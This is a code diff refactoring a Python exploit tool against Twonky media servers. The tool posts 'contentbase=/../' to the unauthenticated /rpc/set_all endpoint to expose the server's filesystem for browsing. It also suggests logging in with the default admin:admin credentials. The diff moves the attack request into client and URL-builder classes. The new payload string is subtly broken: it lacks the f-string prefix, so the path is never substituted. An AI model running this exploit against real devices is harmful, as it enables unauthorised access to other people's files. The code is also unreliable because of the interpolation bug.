@@ -93,19 +93,17 @@ def check_port(host, port):
         return False
 
 # Patch the contentbase parameter
-def set_content_base(host, port):
-    payload = "\ncontentbase=/../\n"
-    url = "http://{0}:{1}/rpc/set_all".format(host, port)
+def set_content_base(host, port, client):
     try:
-        response = requests.post(url, data=payload, timeout=5)
+        response = client.set_content_base("/../")
     except requests.exceptions.ReadTimeout:
         print_color(Fore.RED, "*** Timeout while setting contentbase path to '/' ***")
     except requests.exceptions.ChunkedEncodingError:
         print_color(Fore.RED, "*** 'contentbase' cannot be modified, password protection active ***")
         sys.exit()
     except requests.exceptions.ConnectionError:
-        url = "https://{0}:{1}/rpc/set_all".format(host, port)
-        response = requests.post(url, data=payload, timeout=5, verify=False)
+        response = client.set_content_base("/../", ssl=True)
+
     if response.status_code != 200:
         print_color(Fore.RED, "*** 'contentbase' cannot be modified, password protection active ***")
         print_color(Fore.YELLOW, "*** You should try to login with admin:admin (default creds) ***")
@@ -168,6 +166,10 @@ class TwonkyClient:
     def info_status(self, ssl=False):
         return requests.get(self._url_builder.info_status(ssl), timeout=self._timeout, verify=False)
 
+    def set_content_base(self, path, ssl=False):
+        payload = "\ncontentbase={path}\n"
+        return requests.post(self._url_builder.set_content_base(ssl), data=payload, timeout=self._timeout, verify=False)
+
 class TwonkyURLBuilder:
     def __init__(self, host, port, version="7"):
         self._host = host
@@ -187,6 +189,11 @@ class TwonkyURLBuilder:
     def info_status(self, ssl=False):
         schema = "https" if ssl else "http"
         return f"{schema}://{self._host}:{self._port}/rpc/info_status"
+
+    def set_content_base(self, path, ssl=False):
+        schema = "https" if ssl else "http"
+        return f"{schema}://{self._host}:{self._port}/rpc/set_all"
+
 
 def browser(client):
     def do_request(client, var):
@@ -267,7 +274,7 @@ if __name__ == '__main__':
                 url_builder = TwonkyURLBuilder(host, port, version="8")
                 client = TwonkyClient(host, port, timeout, url_builder)
 
-            if set_content_base(host, port):
+            if set_content_base(host, port, client):
                 browser(client)
 
     except requests.exceptions.ReadTimeout:
